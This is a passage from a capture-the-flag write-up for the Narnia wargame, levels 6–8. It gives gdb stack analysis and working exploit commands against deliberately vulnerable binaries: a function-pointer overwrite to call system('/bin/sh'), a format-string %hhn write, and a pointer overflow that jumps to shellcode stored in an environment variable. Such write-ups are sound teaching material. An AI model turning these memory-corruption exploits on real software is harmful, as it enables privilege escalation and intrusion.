   0x080485c3 <+239>:   mov    eax,DWORD PTR [eax]
   0x080485c5 <+241>:   mov    DWORD PTR [esp+0x8],edx
   0x080485c9 <+245>:   mov    DWORD PTR [esp+0x4],0x0
   0x080485d1 <+253>:   mov    DWORD PTR [esp],eax
   0x080485d4 <+256>:   call   0x8048410 <memset@plt>
   0x080485d9 <+261>:   add    DWORD PTR [esp+0x3c],0x1
   0x080485de <+266>:   mov    eax,DWORD PTR [esp+0x3c]
   0x080485e2 <+270>:   shl    eax,0x2
   0x080485e5 <+273>:   add    eax,DWORD PTR [ebp+0xc]
   0x080485e8 <+276>:   mov    eax,DWORD PTR [eax]
   0x080485ea <+278>:   test   eax,eax
   0x080485ec <+280>:   jne    0x804858f <main+187>
   0x080485ee <+282>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080485f1 <+285>:   add    eax,0x4
   0x080485f4 <+288>:   mov    eax,DWORD PTR [eax]
   0x080485f6 <+290>:   mov    DWORD PTR [esp+0x4],eax
   0x080485fa <+294>:   lea    eax,[esp+0x30]
   0x080485fe <+298>:   mov    DWORD PTR [esp],eax
   0x08048601 <+301>:   call   0x80483c0 <strcpy@plt>
   0x08048606 <+306>:   mov    eax,DWORD PTR [ebp+0xc]
   0x08048609 <+309>:   add    eax,0x8
   0x0804860c <+312>:   mov    eax,DWORD PTR [eax]
   0x0804860e <+314>:   mov    DWORD PTR [esp+0x4],eax
   0x08048612 <+318>:   lea    eax,[esp+0x28]
   0x08048616 <+322>:   mov    DWORD PTR [esp],eax
   0x08048619 <+325>:   call   0x80483c0 <strcpy@plt>
   0x0804861e <+330>:   mov    eax,DWORD PTR [esp+0x38]
   0x08048622 <+334>:   and    eax,0xff000000
   0x08048627 <+339>:   cmp    eax,0xff000000
   0x0804862c <+344>:   jne    0x804863a <main+358>
   0x0804862e <+346>:   mov    DWORD PTR [esp],0xffffffff
   0x08048635 <+353>:   call   0x80483f0 <exit@plt>
   0x0804863a <+358>:   lea    eax,[esp+0x30]
   0x0804863e <+362>:   mov    DWORD PTR [esp],eax
   0x08048641 <+365>:   mov    eax,DWORD PTR [esp+0x38]
   0x08048645 <+369>:   call   eax
   0x08048647 <+371>:   mov    DWORD PTR [esp],0x1
   0x0804864e <+378>:   call   0x80483f0 <exit@plt>
End of assembler dump.
(gdb) b *main+369
Breakpoint 1 at 0x8048645
(gdb) r
Starting program: /games/narnia/narnia6 AAAAAAAA BBBBBBBB

Breakpoint 1, 0x08048645 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6b250 <system>
(gdb) x/50xw $esp
0xffffd6c0:     0xffffd6f0      0xffffd8fd      0x00000021      0x08048399
0xffffd6d0:     0xf7fcf3e4      0x00008000      0x08049910      0xffffffff
0xffffd6e0:     0xffffffff      0xf7e5f116      0x42424242      0x42424242
0xffffd6f0:     0x41414100      0x41414141      0x08048300      0x00000003
0xffffd700:     0x08048660      0x00000000      0x00000000      0xf7e454b3
0xffffd710:     0x00000003      0xffffd7a4      0xffffd7b4      0xf7fd3000
0xffffd720:     0x00000000      0xffffd71c      0xffffd7b4      0x00000000
0xffffd730:     0x08048280      0xf7fceff4      0x00000000      0x00000000
0xffffd740:     0x00000000      0xc59967b5      0xf29fa3a5      0x00000000
0xffffd750:     0x00000000      0x00000000      0x00000003      0x08048420
0xffffd760:     0x00000000      0xf7ff0a90      0xf7e453c9      0xf7ffcff4
0xffffd770:     0x00000003      0x08048420      0x00000000      0x08048441
0xffffd780:     0x080484d4      0x00000003
```

`fp` is stored at `0xffffd6f8` and `b1` and `b2` are directly above it on the stack.

In x86 `esp` points to the argument list of a function just before it's called. In our case `esp` is pointing to `0xffffd6f0`, which is where `b1` is stored. Given that our objective is to execute `system("/bin/sh")` we would like this memory location to store `/bin/sh` (null terminated!) and `0xffffd6f8` (`fp`) to store (`0xf7e6b250`), which is the address of `system`. To achieve this we can use `b1` to overwrite `fp` and `b2` to write `/bin/sh` to the stack (a null byte will be automatically appended to it):

```
narnia6@melinda:/narnia$ ./narnia6 $(python -c "print '\x41'*8 + '\x50\xb2\xe6\xf7' + ' ' + '\x41'*8 + '/bin/sh'")
$ whoami
narnia7
```

Level 7:
--------

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
    char buffer[128];
    int (*ptrf)();

    memset(buffer, 0, sizeof(buffer));
    printf("goodfunction() = %p\n", goodfunction);
    printf("hackedfunction() = %p\n\n", hackedfunction);

    ptrf = goodfunction;
    printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

    printf("I guess you want to come to the hackedfunction...\n");
    sleep(2);
    ptrf = goodfunction;

    snprintf(buffer, sizeof buffer, format);

    return ptrf();
}

int main(int argc, char **argv){
    if (argc <= 1){
        fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
        exit(-1);
    }
    exit(vuln(argv[1]));
}

int goodfunction(){
    printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
    fflush(stdout);

    return 0;
}

int hackedfunction(){
    printf("Way to go!!!!");
    fflush(stdout);
    system("/bin/sh");

    return 0;
}
```

This level is very similar to level 5. We need to use `snprintf` to change the value of `ptrf` to the address of `hackedfunction` instead of `goodfunction`.

```
narnia7@melinda:/narnia$ ./narnia7 AAAAAAA
goodfunction() = 0x804866f
hackedfunction() = 0x8048695

before : ptrf() = 0x804866f (0xffffd69c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```

Since the only differnce between the addresses of `hackedfunction` and `goodfunction` is in the LSB, we can replace only it instead of overwriting the entire address. As before, we use `ltrace` to get the parameter number of our format string:

```
narnia7@melinda:/narnia$ ltrace -s 500 ./narnia7 AAAA%5\$x
__libc_start_main(0x804861d, 2, -10284, 0x80486d0, 0x8048740 <unfinished ...>
printf("goodfunction() = %p\n", 0x804866fgoodfunction() = 0x804866f
)                                                                                       = 27
printf("hackedfunction() = %p\n\n", 0x8048695hackedfunction() = 0x8048695

)                                                                                   = 30
printf("before : ptrf() = %p (%p)\n", 0x804866f, 0xffffd68cbefore : ptrf() = 0x804866f (0xffffd68c)
)                                                                     = 41
puts("I guess you want to come to the hackedfunction..."I guess you want to come to the hackedfunction...
)                                                                        = 50
sleep(2)                                                                                                                         = 0
snprintf("AAAA804866f", 128, "AAAA%5$x", 0xf7fd32e8)                                                                             = 11
puts("Welcome to the goodfunction, but i said the Hackedfunction.."Welcome to the goodfunction, but i said the Hackedfunction..
)                                                             = 61
fflush(0xf7fcfa20)                                                                                                               = 0
exit(0 <unfinished ...>
+++ exited (status 0) +++
narnia7@melinda:/narnia$ ltrace -s 500 ./narnia7 AAAA%6\$x
__libc_start_main(0x804861d, 2, -10284, 0x80486d0, 0x8048740 <unfinished ...>
printf("goodfunction() = %p\n", 0x804866fgoodfunction() = 0x804866f
)                                                                                       = 27
printf("hackedfunction() = %p\n\n", 0x8048695hackedfunction() = 0x8048695

)                                                                                   = 30
printf("before : ptrf() = %p (%p)\n", 0x804866f, 0xffffd68cbefore : ptrf() = 0x804866f (0xffffd68c)
)                                                                     = 41
puts("I guess you want to come to the hackedfunction..."I guess you want to come to the hackedfunction...
)                                                                        = 50
sleep(2)                                                                                                                         = 0
snprintf("AAAA41414141", 128, "AAAA%6$x", 0xf7fd32e8)                                                                            = 12
puts("Welcome to the goodfunction, but i said the Hackedfunction.."Welcome to the goodfunction, but i said the Hackedfunction..
)                                                             = 61
fflush(0xf7fcfa20)                                                                                                               = 0
exit(0 <unfinished ...>
+++ exited (status 0) +++
```

which is `6`. The LSB of `ptrf` is stored at `0xffffd68c` and our goal is to change it to `0x95` (which is 149 in decimal). Four bytes are already printed because of the address we specify in the beginning of the format string, thus we need to add another 145:

```
narnia7@melinda:/narnia$ ./narnia7 $(printf '\x8c\xd6\xff\xff')%145x%6\$hhn
goodfunction() = 0x804866f
hackedfunction() = 0x8048695

before : ptrf() = 0x804866f (0xffffd68c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
```

Notice that I used the `hh` specfier, which only writes one byte (the LSB in our case).

Level 8 (last):
---------------

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global unti i find a fix
// -morla
int i;

void func(char *b){
    char *blah=b;
    char bok[20];
    //int i=0;

    memset(bok, '\0', sizeof(bok));
    for(i=0; blah[i] != '\0'; i++)
        bok[i]=blah[i];

    printf("%s\n",bok);
}

int main(int argc, char **argv){

    if(argc > 1)
        func(argv[1]);
    else
        printf("%s argument\n", argv[0]);

    return 0;
}
```

There is nothing very obvious here, but notice that `bok` is just above the pointer to our string on the stack. Therefore, by carefully overflowing `bok` into `blah` we can change the base address from which bytes are read and written to `bok` (to the stack). We can use this to overwrite the return address of `func` and redirect execution to our shellcode, which we'll store in some environment variable.

```
narnia8@melinda:/narnia$ gdb -q --args ./narnia8 $(python -c "print '\x41'*20")
Reading symbols from /games/narnia/narnia8...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas func
Dump of assembler code for function func:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x38
   0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [ebp-0xc],eax
   0x08048400 <+12>:    mov    DWORD PTR [esp+0x8],0x14
   0x08048408 <+20>:    mov    DWORD PTR [esp+0x4],0x0
   0x08048410 <+28>:    lea    eax,[ebp-0x20]
   0x08048413 <+31>:    mov    DWORD PTR [esp],eax
   0x08048416 <+34>:    call   0x8048330 <memset@plt>
   0x0804841b <+39>:    mov    DWORD PTR ds:0x80497c0,0x0
   0x08048425 <+49>:    jmp    0x8048449 <func+85>
   0x08048427 <+51>:    mov    eax,ds:0x80497c0
   0x0804842c <+56>:    mov    edx,DWORD PTR ds:0x80497c0
   0x08048432 <+62>:    add    edx,DWORD PTR [ebp-0xc]
   0x08048435 <+65>:    movzx  edx,BYTE PTR [edx]
   0x08048438 <+68>:    mov    BYTE PTR [ebp+eax*1-0x20],dl
   0x0804843c <+72>:    mov    eax,ds:0x80497c0
   0x08048441 <+77>:    add    eax,0x1
   0x08048444 <+80>:    mov    ds:0x80497c0,eax
   0x08048449 <+85>:    mov    eax,ds:0x80497c0
   0x0804844e <+90>:    add    eax,DWORD PTR [ebp-0xc]
   0x08048451 <+93>:    movzx  eax,BYTE PTR [eax]
   0x08048454 <+96>:    test   al,al
   0x08048456 <+98>:    jne    0x8048427 <func+51>
   0x08048458 <+100>:   mov    eax,0x8048580
   0x0804845d <+105>:   lea    edx,[ebp-0x20]
   0x08048460 <+108>:   mov    DWORD PTR [esp+0x4],edx
   0x08048464 <+112>:   mov    DWORD PTR [esp],eax
   0x08048467 <+115>:   call   0x8048300 <printf@plt>
   0x0804846c <+120>:   leave
   0x0804846d <+121>:   ret
End of assembler dump.
(gdb) b *func+115
Breakpoint 1 at 0x8048467
(gdb) r
Starting program: /games/narnia/narnia8 AAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048467 in func ()
(gdb) x/50xw $esp
0xffffd6c0:     0x08048580      0xffffd6d8      0x00000014      0xf7fceff4
0xffffd6d0:     0x080484b0      0x08049794      0x41414141      0x41414141
0xffffd6e0:     0x41414141      0x41414141      0x41414141      0xffffd8f1
0xffffd6f0:     0xffffffff      0xf7e5f116      0xffffd718      0x0804848d
0xffffd700:     0xffffd8f1      0x00000000      0x080484b9      0xf7fceff4
0xffffd710:     0x080484b0      0x00000000      0x00000000      0xf7e454b3
0xffffd720:     0x00000002      0xffffd7b4      0xffffd7c0      0xf7fd3000
0xffffd730:     0x00000000      0xffffd71c      0xffffd7c0      0x00000000
0xffffd740:     0x0804820c      0xf7fceff4      0x00000000      0x00000000
0xffffd750:     0x00000000      0xa1ffc16d      0x96f9657d      0x00000000
0xffffd760:     0x00000000      0x00000000      0x00000002      0x08048340
0xffffd770:     0x00000000      0xf7ff0a90      0xf7e453c9      0xf7ffcff4
0xffffd780:     0x00000002      0x08048340
(gdb) x/s 0xffffd8f1
0xffffd8f1:      'A' <repeats 20 times>
(gdb) i f
Stack level 0, frame at 0xffffd700:
 eip = 0x8048467 in func; saved eip 0x804848d
 called by frame at 0xffffd720
 Arglist at 0xffffd6f8, args:
 Locals at 0xffffd6f8, Previous frame's sp is 0xffffd700
 Saved registers:
  ebp at 0xffffd6f8, eip at 0xffffd6fc
(gdb) p 0xffffd6fc-0xffffd6d8
$1 = 36
```

Notice that when `i=20` the LSB of the base address (`blah`) is overwritten. Overwriting this value with the the same value minus 20, will cause the next byte to be read from `blah+1` (second char of `blah`), as `-20+21=1`, thereby copying `blah` for the second time onto the stack, but to higher addresses, until finally overwriting the return address with `blah[16]-blah[19]` (inclusive). Overall, 21 bytes are needed.

Lets make the program segfault and extract the addresses of our shellcode and `blah`:

```
narnia8@melinda:/narnia$ mkdir /tmp/doge8
narnia8@melinda:/narnia$ cd /tmp/doge8
narnia8@melinda:/tmp/doge8$ vim same_fucking_shellcode.asm
narnia8@melinda:/tmp/doge8$ nasm same_fucking_shellcode.asm 
narnia8@melinda:/tmp/doge8$ export BANECAT=$(cat same_fucking_shellcode)
narnia8@melinda:/tmp/doge8$ cp /narnia/narnia8 .
narnia8@melinda:/tmp/doge8$ ulimit -c unlimited
narnia8@melinda:/tmp/doge8$ ./narnia8 $(python -c "print '\x41'*20 + '\x99'")
Segmentation fault (core dumped)
narnia8@melinda:/tmp/doge8$ gdb -q -c ./core
[New LWP 28703]
Core was generated by `...`
Program terminated with signal 11, Segmentation fault.
#0  0x08048451 in ?? ()
(gdb) x/10xw $ebp
0xffffd6f8:     0xffffd718      0x0804848d      0xffffd8e0      0x00000000
0xffffd708:     0x080484b9      0xf7fceff4      0x080484b0      0x00000000
0xffffd718:     0x00000000      0xf7e454b3
(gdb) x/s 0xffffd8e0
0xffffd8e0:      'A' <repeats 20 times>"\231, "
(gdb) x/6s $esp+0x800
0xffffdec0:      "sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xffffdefd:      "PWD=/tmp/doge8"
0xffffdf0c:      "LANG=en_US.UTF-8"
0xffffdf1d:      "SHLVL=1"
0xffffdf25:      "HOME=/home/narnia8"
0xffffdf38:      "BANECAT=1\300Ph//shh/bin\211\343P\211\342P\211\341\260\v\315\200"
```

Therefore:
```
narnia8@melinda:/narnia$ ./narnia8 $(python -c "print '\x41' + '\xd8\xff\xff' + '\x41'*12 + '\x40\xdf\xff\xff' + '\xcc'")
$ whoami
narnia9
```
And we are done!
